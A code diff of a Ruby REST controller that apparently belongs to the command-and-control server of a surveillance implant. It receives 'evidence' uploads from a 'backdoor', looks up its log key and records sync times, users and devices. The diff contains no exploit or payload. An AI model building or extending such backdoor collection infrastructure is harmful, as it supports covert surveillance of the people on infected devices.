@@ -41,17 +41,17 @@ class EvidenceController < RESTController
 
     # save the evidence in the db
     begin
-      id = EvidenceManager.store_evidence session, @req_content.size, @req_content
+      id = EvidenceManager.instance.store_evidence session, @req_content.size, @req_content
       # notify the worker
       trace :info, "Evidence saved. Notifying worker of [#{session[:instance]}][#{id}]"
       notification = {session[:instance] => [id]}.to_json
       request = EM::HttpRequest.new('http://127.0.0.1:5150').post :body => notification
       request.callback {|http| http.response}
     rescue
-      return STATUS_NOT_FOUND
+      return RESTController.not_found
     end
     
-    return STATUS_OK, *json_reply({:bytes => @req_content.size})
+    return RESTController.ok({:bytes => @req_content.size})
   end
   
   # used to report that the activity of an instance is starting
@@ -62,20 +62,25 @@ class EvidenceController < RESTController
     session = params.symbolize
 
     # retrieve the key from the db
-    key = DB.instance.backdoor_evidence_key(session[:bid])
+    backdoor = Item.where({_id: session[:bid]}).first
+    key = backdoor[:logkey]
     
     # convert the string time to a time object to be passed to 'sync_start'
     time = Time.at(params['sync_time']).getutc
     
     # store the status
-    EvidenceManager.sync_start session, params['version'], params['user'], params['device'], params['source'], time.to_i, key
+    EvidenceManager.instance.sync_start session, params['version'], params['user'], params['device'], params['source'], time.to_i, key
 
-    # update db with sync status
-    DB.instance.backdoor_sync_start session[:bid], time, params['user'], params['device'], params['source']
+    # update the stats
+    backdoor.stat.last_sync = time
+    backdoor.stat.source = params['source']
+    backdoor.stat.user = params['user']
+    backdoor.stat.device = params['device']
+    backdoor.save
     
-    return STATUS_OK
+    return RESTController.ok
   end
-
+  
   # used to report that the processing of an instance has finished
   def stop
     require_auth_level :server
@@ -84,9 +89,9 @@ class EvidenceController < RESTController
     session = params.symbolize
 
     # store the status
-    EvidenceManager.sync_end session
+    EvidenceManager.instance.sync_end session
 
-    return STATUS_OK
+    return RESTController.ok
   end
 
   # used to report that the activity on an instance has timed out
@@ -97,9 +102,9 @@ class EvidenceController < RESTController
     session = params.symbolize
 
     # store the status
-    EvidenceManager.sync_timeout session
+    EvidenceManager.instance.sync_timeout session
 
-    return STATUS_OK
+    return RESTController.ok
   end
 
 end
